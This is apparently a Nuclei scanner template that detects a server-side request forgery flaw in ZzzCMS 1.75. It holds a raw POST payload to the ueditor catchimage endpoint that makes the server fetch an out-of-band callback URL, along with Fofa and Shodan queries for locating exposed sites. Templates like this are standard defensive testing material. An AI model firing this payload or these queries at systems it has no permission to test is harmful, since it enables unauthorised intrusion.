http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - condition: and
    part: body
    type: word
    words:
    - '{"state":'
    - 'list":'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /plugins/ueditor/php/controller.php?action=catchimage&upfolder=1 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    source[0]=http://{{interactsh-url}}/{{filename}}.txt

    '
id: zzzcms-ssrf
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:zzzcms:zzzcms:*:*:*:*:*:*:*:*
  description: ZzzCMS (A Lightweight ASP.NET content management system) is vulnerable
    to SSRF(Server-Side Request Forgery).
  metadata:
    fofa-query: title="ZzzCMS"
    max-request: 1
    product: zzzcms
    shodan-query: html:"ZzzCMS"
    vendor: zzzcms
    verified: true
  name: ZzzCMS 1.75 - Server-Side Request Forgery
  reference:
  - https://www.hacking8.com/bug-web/Zzzcms/Zzzcms-1.75-ssrf.html
  severity: high
  tags: zzzcms,ssrf,oast,vuln
variables:
  filename: '{{to_lower(rand_text_alpha(4))}}'
